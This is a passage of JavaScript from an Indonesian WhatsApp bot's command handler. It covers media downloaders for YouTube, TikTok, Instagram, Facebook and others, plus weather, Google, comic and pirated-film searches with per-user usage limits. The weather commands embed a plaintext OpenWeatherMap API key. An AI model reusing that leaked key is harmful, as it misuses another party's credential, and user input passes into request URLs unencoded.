if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} DJ melodi kane`)
if (budy.match(`colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return tolakk('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
const youtube = require("yt-search");
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) return warning('Video/Audio Tidak Ditemukan')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
downloadMp3(convert.url)
} catch (e) {
console.log(e)
m.reply(`*Hanya Dapat Mencari Lagu, Tidak Dapat Mencari Channel...*`);
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getvideo': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return warning(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
downloadMp4(urls[text - 1])
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getmusic': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return warning(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
downloadMp3(urls[text - 1])
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ytmp3': case 'yta': case 'ytaudio': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
if (!text.match('youtu')) return warning('Link Kamu Salah!')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
downloadMp3(text)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ytmp4': case 'ytv': case 'ytvideo': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
if (!text.match('youtu')) return warning('Link Kamu Salah!')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
downloadMp4(text)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ytv2': case 'ytvideo2': { 
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
downloadMp4(text)
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .ytv *url*`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'lk21':{//Fix Qioo
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning (`Nyari Apa?`) 
m.reply (mess.wait) 
let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
 try {
let json = await res.json()
json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
m.reply(json)
} catch (e) {
m.reply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'jarak':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return warning (`Contoh: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return vreden.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else m.reply(data.desc)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ramalancuaca': case 'cuacamendatang':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} Yogyakarta`)
try {
let teks = `*乂 RAMALAN CUACA*\n\n`
const apiUrl = `https://api.openweathermap.org/data/2.5/forecast?q=${text}&appid=060a6bcfa19809c2cd4d97a212b19273&units=metric&cnt=${5 * 8}`
const response = await fetch(apiUrl);
const data = await response.json();
data.list.forEach((item, index) => {
teks += `*Tanggal:* ${item.dt_txt}
*Cuaca:* ${item.weather[0].description}
*Temperatur:* ${item.main.temp}°C
*Kelembaban:* ${item.main.humidity}%
*Kecepatan angin:* ${item.wind.speed} m/s

────────────────────\n\n`
});
balas(teks)
} catch (error) {
console.log('Terjadi kesalahan:', error);
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'infocuaca': case 'cuaca': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} Yogyakarta`)
try {
const response = axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`
        )
const res = await response
const lokasi_name = res.data.name
const country = res.data.sys.country
const weather = res.data.weather[0].description
const temperature = res.data.main.temp + "°C"
const minimum_temperature = res.data.main.temp_min + "°C"
const maximum_temperature = res.data.main.temp_max + "°C"
const humidity = res.data.main.humidity + "%"
const pressure = res.data.main.pressure + "HPa"
const wind = res.data.wind.speed + "km/h"
const long = res.data.coord.lon
const lat = res.data.coord.lat
vreden.sendMessage(m.chat, { location: { degreesLatitude: lat, degreesLongitude: long, name: `乂 Cuaca - ${lokasi_name}`, address: `Berikut info cuaca hari ini` } })
await sleep(1000)
balas(`• *Lokasi* : ${lokasi_name}
• *Country* : ${country}
• *Cuaca* : ${weather}
• *Suhu saat ini* : ${temperature}
• *Suhu tertinggi* : ${maximum_temperature}
• *Suhu terendah* : ${minimum_temperature}
• *Kelembapan* : ${humidity}
• *Angin* : ${wind}
• *Tekanan* : ${pressure}

> ${footxt}`)
} catch (e) {
m.reply('Lokasi Tidak Ditemukan, Masukan Lokasi Yang Umum!')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'google':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
m.reply(teks)
})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'komikusearch': case 'komikus': case 'comics': case 'comicsearch':{//Fix Qioo
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} tensei`);
async function searchKomiku(query) {
    const url = 'https://data.komiku.id/cari/?post_type=manga&s=' + query; // Ganti dengan URL pencarian yang sesuai

    try {
        const response = await fetch(url);
        const html = await response.text();
        const $ = cheerio.load(html);
        const results = [];

        $('div.daftar > div.bge').each((index, element) => {
            const imageSrc = $(element).find('.bgei img').attr('data-src');
            const link = $(element).find('.bgei a').attr('href');
            const title = $(element).find('.kan a h3').text().trim();
            const subtitle = $(element).find('.kan .judul2').text().trim();
            const update = $(element).find('.kan p').text().trim();

            const chapters = [];
            $(element).find('.kan .new1').each((idx, el) => {
                const chapterTitle = $(el).find('a').attr('title');
                const chapterNumber = $(el).find('span:last-child').text();
                chapters.push({
                    title: chapterTitle,
                    number: chapterNumber
                });
            });

            results.push({
                imageSrc: imageSrc || 'Tidak diketahui',
                link: link || 'Tidak diketahui',
                title: title || 'Tidak diketahui',
                subtitle: subtitle || 'Tidak diketahui',
                update: update || 'Tidak diketahui',
                chapters: chapters.length > 0 ? chapters.map(({
                    title,
                    number
                }, index) => `\n${index + 1}.\n${title}\n${number}\n\n`).join('') : 'Tidak diketahui'
            });
        });

        return results;
    } catch (error) {
        console.error(error);
        return [];
    }
}

let res = await searchKomiku(text)
        let teks = res.map((v, index) => {
            return `*[ ${index + 1} ]*
*Image Url:* ${v.imageSrc}
*Title:* ${v.title}
*Alternate Titles:* ${v.subtitle}
*Update:* ${v.update}
*Chapters:* ${v.chapters}
*Link:* ${v.link}
   `.trim()
        }).filter(v => v).join("\n\n________________________\n\n")
        await m.reply(teks)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 };
break;
case 'fbdl': case 'facebook': case 'fb':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Masukan Link Nya!!!`)
if (!isUrl(args[0])) return warning(`Apakah Itu Terlihat Seperti Link?`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await snapsave(text)
vreden.sendMessage(m.chat, { video: { url: anu.links["Download High Quality"] }, caption: '*[ V1 ]* Facebook ✅' }, { quoted: m })
}catch (error) {
let anu = await snapsavev2(text)
vreden.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: '*[ V2 ]* Facebook ✅' }, { quoted: m })
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'fb2': { 
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *url*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try {
let anu = await snapsavev2(text)
vreden.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: '*[ V2 ]* Facebook ✅' }, { quoted: m })
} catch (error) {
await vreden.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'twitter': case 'twittdl': case 'twdl':{ 
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *url*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
let twitter = await twiterdl(text)
vreden.sendMessage(m.chat, { video: { url: twitter.data.downloads[1].url }, caption: `*[ V1 ]* X - Downloader ✅\n`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'capcut':{
if (db.data.users[m.sender].limit < 1) return m.reply(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return m.reply(`Masukan Link Nya\nexemple\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await capcutdl(text)
vreden.sendMessage(m.chat, { video: { url: `https://ssscap.net${anu.originalVideoUrl}`}, caption: `*${anu.title}*\n\n- Desk: ${anu.description}\n- Digunakan: ${anu.usage}\n`}, {quoted: m})
} catch (error) {
balas('Terjadi kesalahan!')
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'igstory': case 'igs': case 'instagramstory': case 'instastory': case 'igslide': case 'igphoto': case 'instaphoto': case 'instafoto': case 'igfoto': case 'instagram': case 'ig': case 'igdl': case 'igvideo': case 'instavideo': case 'instavid': case 'igreels': case 'instareels': case 'instareel': case 'igtv': case 'instatv':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await igdown(text)
let c = 0
for (let gom of anu.data) {
if (gom.type == 'video') await vreden.sendMessage(m.chat, { video: { url: gom.url}, caption: `*[ V1 ]* Done Bangg ✅`}, {quoted: m})
if (gom.type == 'image') {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: gom.url }, caption: `*[ V1 ]* IG Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: gom.url }}, { quoted: m })
c += 1
}
}
}catch (error){
m.reply(`Sorry this video can't be download, Please try typing .ig2 *url*`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'igstory2': case 'igs2': case 'instagramstory2': case 'instastory2': case 'igslide2': case 'igphoto2': case 'instaphoto2': case 'instafoto2': case 'igfoto2': case 'instagram2': case 'ig2': case 'igdl2': case 'igvideo2': case 'instavideo2': case 'instavid2': case 'igreels2': case 'instareels2': case 'instareel2': case 'igtv2': case 'instatv2':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *url*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/igdownload?url=${text}`)
let c = 0
for (let gom of anu.result.response.data) {
if (gom.type == 'video') await vreden.sendMessage(m.chat, { video: { url: gom.url}, caption: `*[ V1 ]* Done Bangg ✅`}, {quoted: m})
if (gom.type == 'image') {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: gom.url }, caption: `*[ V1 ]* IG Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: gom.url }}, { quoted: m })
c += 1
}
}
}catch (error){
m.reply(`Sorry this video can't be download, Please try typing .ig2 *url*`);
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tiktoksearch': case 'tiktoks': case 'ttsearch':{
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
let serach = await tiktokSearchVideo(text)
let teks = '*TikTok Search*\n\n\nketik *ttget* untuk mengambil video\ngunakan dengan nomor urutan, contoh *ttget 1*\n\n'
let no = 1
for (let i of serach.videos) {
let sut = await JSON.stringify(i.author)
teks += `*⭔ No Urutan* : ${no++}\n*⭔ Title* : ${i.title}\n*⭔ Video ID* : ${i.video_id}\n*⭔ Username* : ${i.author.unique_id}\n*⭔ Nickname* : ${i.author.nickname}\n*⭔ Duration* : ${i.duration} detik\n*⭔ VT Like* : ${i.digg_count}\n*⭔ Comment* : ${i.comment_count}\n*⭔ Share* : ${i.share_count}\n*⭔ Url* : https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n─────────────────\n`
}
vreden.sendMessage(m.chat, { video: { url: `https://tikwm.com${serach.videos[0].play}` },  caption: teks }, { quoted: m })
}catch (error) {
console.log(error)
m.reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttget': {
if (!text) return warning(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
let urls = quoted.text.match(new RegExp(/(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/, 'gi'))
if (!urls) return warning(`Mungkin pesan yang anda reply tidak mengandung result tiktok search`)
try{
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${urls[text - 1]}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
vreden.sendMessage(m.chat, { video: { url: imgs.url }, caption: `*[ V1 ] TikTok Download 📥*\n\n- Nickname: ${anu.result.author.nickname}\n- VT Like: ${anu.result.stats.likes}\n- Komentar: ${anu.result.stats.comment}\n- Share: ${anu.result.stats.share}\n- View: ${anu.result.stats.views}\n\n`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: imgs.url }, caption: `*[ V1 ]* TikTok Photo 🖼️\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
}catch (error) {
try{
const data = await tiktokdl(urls[text - 1])
console.log(data)
vreden.sendMessage(m.chat, { video: { url: data.video}, caption: `*[ V3 ]* Done boss ✅`}, {quoted: m})
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttslide': case 'tiktokfoto': case 'tiktokmp4': case 'tt': case 'ttnowm': case 'tiktoknowm': case 'tiktok':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
vreden.sendMessage(m.chat, { video: { url: imgs.url }, caption: `*[ V1 ] TikTok Download 📥*\n\n- Nickname: ${anu.result.author.nickname}\n- VT Like: ${anu.result.stats.likes}\n- Komentar: ${anu.result.stats.comment}\n- Share: ${anu.result.stats.share}\n- View: ${anu.result.stats.views}\n\n`}, {quoted: m})
}
if (imgs.type == "photo") {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: imgs.url }, caption: `*[ V1 ]* TikTok Photo 🖼️\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
}catch (error) {
console.log(error)
try{
const data = await tiktokdl(text)
console.log(data)
vreden.sendMessage(m.chat, { video: { url: data.video}, caption: `*[ V4 ]* Done boss ✅`}, {quoted: m})
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tiktok2': case 'tt2': case 'ttnowm2': case 'tiktokmp42': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
vreden.sendMessage(m.chat, { video: { url: imgs.url }, caption: `*[ V1 ] TikTok Download 📥*\n\n- Nickname: ${anu.result.author.nickname}\n- VT Like: ${anu.result.stats.likes}\n- Komentar: ${anu.result.stats.comment}\n- Share: ${anu.result.stats.share}\n- View: ${anu.result.stats.views}\n\n`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: imgs.url }, caption: `*[ V1 ]* TikTok Photo 🖼️\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tiktok3': case 'tt3': case 'ttnowm3': case 'tiktokmp43': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{
const data = await tiktokdl(text)
console.log(data)
vreden.sendMessage(m.chat, { video: { url: data.video}, caption: `Done boss ✅`}, {quoted: m})
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttaudio': case 'tiktokmp3': case 'ttmp3': case 'tiktokaudio':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let audio = anu.result.music_info.url
vreden.sendMessage(m.chat, {audio : {url : audio }, mimetype:'audio/mpeg'}, {quoted:m})
} catch (error) {
try {
const data = await tiktokdl(text)
vreden.sendMessage(m.chat, {audio : {url : data.music }, mimetype:'audio/mpeg'}, {quoted:m})
} catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tiktokmp32': case 'ttmp32': case 'tiktokaudio2':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let audio = anu.result.music_info.url
vreden.sendMessage(m.chat, {audio : {url : audio }, mimetype:'audio/mpeg'}, {quoted:m})
} catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tiktokmp33': case 'ttmp33': case 'tiktokaudio3':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const data = await tiktokdl(text)
console.log(data)
vreden.sendMessage(m.chat, {audio : {url : data.music }, mimetype:'audio/mpeg'}, {quoted:m})
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *url*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let res = await GDriveDl(text)
await balas(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
vreden.sendMessage(m.chat, { document: { url: res.downloadUrl }, mimetype: res.mimetype, fileName: res.fileName }, { quoted: m })
} catch (error) {
balas('Terjadi kesalahan Om, Coba Cek Link Nya...')
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mediafire': case 'mfire': case 'mfdl':{
if (db.data.users[m.sender].limit < 1) return tolakk(`Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return warning(mess.error.Iv)
if (!text.includes('mediafire.com')) return warning(mess.error.Iv)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
addCountCmd('mediafire', m.sender, _cmd)
try {
var data = await mediafireDl(text)
fileNama = decodeURIComponent(data[0].nama)
var media = await getBuffer(data[0].link)
if (data[0].mime.includes('mp4')) {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data[0].mime.includes('mp3')) {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'application/'+data[0].mime }, { quoted: m })
}
} catch (error) {
try {
var { result } = await fetchJson(`https://api.vreden.my.id/api/mediafiredl?url=${text}`)
fileNama = decodeURIComponent(result[0].nama)
var media = await getBuffer(result[0].link)
if (result[0].mime.includes('mp4')) {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'video/mp4' }, { quoted: m })
} else if (result[0].mime.includes('mp3')) {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
vreden.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'application/'+result[0].mime }, { quoted: m })
}
} catch (error) {
m.reply("Terjadi kesalahan atau link tidak valid")
}
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gitclone':{
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/`)
if (!regx.test(text)) return warning('Linknya salah')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
vreden.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
